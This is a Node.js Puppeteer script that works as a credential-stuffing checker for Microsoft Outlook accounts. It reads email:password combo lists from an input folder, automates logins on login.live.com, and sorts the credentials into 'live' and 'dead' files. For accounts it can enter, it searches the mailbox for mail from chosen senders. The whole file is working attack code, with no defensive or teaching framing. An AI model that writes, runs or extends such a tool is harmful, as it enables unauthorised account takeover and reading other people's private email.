const puppeteer = require('puppeteer');
const fs = require('fs');
const fsp = require('fs').promises;
const path = require('path');
const readline = require('readline');
const chalk = require('chalk');

// URLs as constants
const LOGIN_URL = 'https://login.live.com/';
const MAILBOX_URL = 'https://outlook.live.com/mail/0/';
const SEARCH_INPUT_SELECTOR = '#topSearchInput';
const SEARCH_BUTTON_SELECTOR = 'button[aria-label="Search"]';
const STAY_SIGNED_IN_SELECTOR = '#idSIButton9';
const EMAIL_ERROR_SELECTOR = '#i0116Error';
const PASSWORD_ERROR_SELECTOR = '#i0118Error';

// Stats to keep track of the results
const stats = {
    total: 0,
    checked: 0,
    live: 0,
    dead: 0,
    startTime: null,
};

// Sleep function to pause execution
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Function to ensure the output folder exists
async function ensureFolderExists(folderPath) {
    try {
        await fsp.access(folderPath);
    } catch {
        await fsp.mkdir(folderPath, { recursive: true });
    }
}

// Function to read filters from filter.txt
async function readFilters(filePath) {
    try {
        const data = await fs.promises.readFile(filePath, 'utf8');
        const filters = data.trim().split('\n').filter(email => email);
        if (filters.length === 0) {
            return null;  // Return null if file is empty
        }
        return filters;
    } catch (error) {
        return null;  // Return null if file is missing
    }
}

async function getInputFiles() {
    const inputFolder = path.join(process.cwd(), 'input');
    await ensureFolderExists(inputFolder);

    const files = await fsp.readdir(inputFolder);
    const txtFiles = files.filter(file => file.endsWith('.txt'));

    if (txtFiles.length === 0) {
        console.error(chalk.red('No .txt files found in the input folder.'));
        process.exit(1);
    }

    return txtFiles.map(file => path.join(inputFolder, file));
}

// Function to ask the user if they want to proceed without filters
async function askToProceedWithoutFilters() {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    return new Promise(resolve => {
        rl.question('No filters found in filter.txt. Proceed without filtering? (y/n): ', answer => {
            rl.close();
            resolve(answer.toLowerCase() === 'y');
        });
    });
}

// Function to handle Puppeteer login and email search
async function checkEmailWithPuppeteer(email, password, filters, liveWriter, deadWriter) {
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();

    try {
        console.log(`Attempting login for: ${email}`);

        // Step 1: Navigate to Microsoft login page
        await page.goto(LOGIN_URL, { waitUntil: 'networkidle2' });

        // Step 2: Fill in email and check for errors
        await page.waitForSelector('#i0116');
        await page.type('#i0116', email, { delay: 100 });
        await page.click('#idSIButton9');

        // Wait for either the password input or email error message
        const emailError = await Promise.race([
            page.waitForSelector('#i0118', { timeout: 5000 }).then(() => null),
            page.waitForSelector(EMAIL_ERROR_SELECTOR, { timeout: 5000 })
        ]);

        if (emailError) {
            const errorMsg = await page.$eval(EMAIL_ERROR_SELECTOR, el => el.textContent);
            console.log(chalk.red(`❌ Email error: ${errorMsg}`));
            deadWriter.write(`${email}:${password} | Email Error: ${errorMsg}\n`);
            await browser.close();
            return;
        }

        // Step 3: Fill in password and check for errors
        await page.type('#i0118', password, { delay: 100 });
        await page.click('#idSIButton9');

        const passwordError = await Promise.race([
            page.waitForSelector(STAY_SIGNED_IN_SELECTOR, { timeout: 5000 }).then(() => null),
            page.waitForSelector(PASSWORD_ERROR_SELECTOR, { timeout: 5000 })
        ]);

        if (passwordError) {
            const errorMsg = await page.$eval(PASSWORD_ERROR_SELECTOR, el => el.textContent);
            console.log(chalk.red(`❌ Password error: ${errorMsg}`));
            deadWriter.write(`${email}:${password} | Password Error: ${errorMsg}\n`);
            await browser.close();
            return;
        }

        // Step 4: Handle "Stay Signed In?" prompt
        await page.click(STAY_SIGNED_IN_SELECTOR);
        console.log(chalk.green(`✅ Login successful for: ${email}`));

        // Step 5: Proceed with email filtering
        await page.goto(MAILBOX_URL, { waitUntil: 'networkidle2' });
        await page.waitForSelector(SEARCH_INPUT_SELECTOR);

        let liveEntry = `${email}:${password}`;
        if (filters && filters.length > 0) {
            for (const filterEmail of filters) {
                console.log(`Searching for emails from: ${filterEmail}`);
                await page.type(SEARCH_INPUT_SELECTOR, `from:${filterEmail}`);
                await page.click(SEARCH_BUTTON_SELECTOR);

                // Wait for search results
                try {
                    await page.waitForSelector('.jGG6V.gDC9O', { timeout: 5000 });
                    const results = await page.$$eval('.jGG6V.gDC9O', elements => elements.length);
                    console.log(`Found ${results} result(s) for ${filterEmail}`);

                    if (results > 0) {
                        liveEntry += ` | Found emails from ${filterEmail}`;
                    } else {
                        liveEntry += ` | No emails found from ${filterEmail}`;
                    }
                } catch (e) {
                    console.log(`No search results found or timed out for ${filterEmail}`);
                    liveEntry += ` | No emails found from ${filterEmail}`;
                }

                // Clear search input for the next filter
                await page.evaluate(() => document.querySelector(SEARCH_INPUT_SELECTOR).value = '');
            }
        } else {
            console.log('No filters applied.');
        }

        stats.live++;
        liveWriter.write(liveEntry + '\n');
        console.log(chalk.green(`✅ ${liveEntry}`));

    } catch (error) {
        stats.dead++;
        console.error(`Login failed for ${email}:`, error);
        deadWriter.write(`${email}:${password} | Error: ${error.message}\n`);
    } finally {
        await page.close();
        await browser.close();
    }

    stats.checked++;
    updateStatus();
}

let statusInterval;

function updateStatus() {
    const elapsedTimeInMinutes = (Date.now() - stats.startTime) / 60000;
    const emailsPerMinute = (stats.checked / elapsedTimeInMinutes).toFixed(2);
    const remainingCount = stats.total - stats.checked;

    readline.cursorTo(process.stdout, 0, process.stdout.rows);
    readline.clearLine(process.stdout, 0);
    process.stdout.write(
        chalk.cyan(`Total: ${stats.total} | Checked: ${stats.checked} | Live: ${stats.live} | Dead: ${stats.dead} | Remaining: ${remainingCount} | Speed: ${emailsPerMinute}/min`)
    );
}

async function processFile(inputFile, filters) {
    const outputFolder = path.join(process.cwd(), 'output');
    await ensureFolderExists(outputFolder);

    const baseName = path.basename(inputFile, '.txt');
    const liveFile = path.join(outputFolder, `${baseName}_live.txt`);
    const deadFile = path.join(outputFolder, `${baseName}_dead.txt`);

    const liveWriter = fs.createWriteStream(liveFile, { flags: 'a' });
    const deadWriter = fs.createWriteStream(deadFile, { flags: 'a' });

    const currentDate = new Date().toLocaleString();
    const logHeader = `Date: ${currentDate}\nFile: ${inputFile}\n\n`;
    liveWriter.write(logHeader);
    deadWriter.write(logHeader);

    console.log(chalk.blue(logHeader));

    const data = await fsp.readFile(inputFile, 'utf8');
    const lines = data.trim().split('\n');
    stats.total += lines.length;

    console.log('\n');

    stats.startTime = Date.now();

    statusInterval = setInterval(updateStatus, 1000);

    const batchSize = 1;
    for (let i = 0; i < lines.length; i += batchSize) {
        const batch = lines.slice(i, i + batchSize);
        await Promise.all(batch.map(line => {
            const [email, password] = line.split(':');
            return checkEmailWithPuppeteer(email, password, filters, liveWriter, deadWriter);
        }));
    }

    clearInterval(statusInterval);
    liveWriter.end();
    deadWriter.end();
}

async function main() {
    const filters = await readFilters(path.join(__dirname, 'filter.txt'));

    if (!filters) {
        const proceed = await askToProceedWithoutFilters();
        if (!proceed) {
            console.log(chalk.red('Process aborted due to missing or empty filter.txt.'));
            return;
        }
    }

    const inputFiles = await getInputFiles();
    stats.startTime = Date.now();

    for (const inputFile of inputFiles) {
        await processFile(inputFile, filters);
    }

    console.log(chalk.blue('\nAuthentication process completed.'));
    updateStatus();
    console.log('\n');
}

main().catch(console.error);
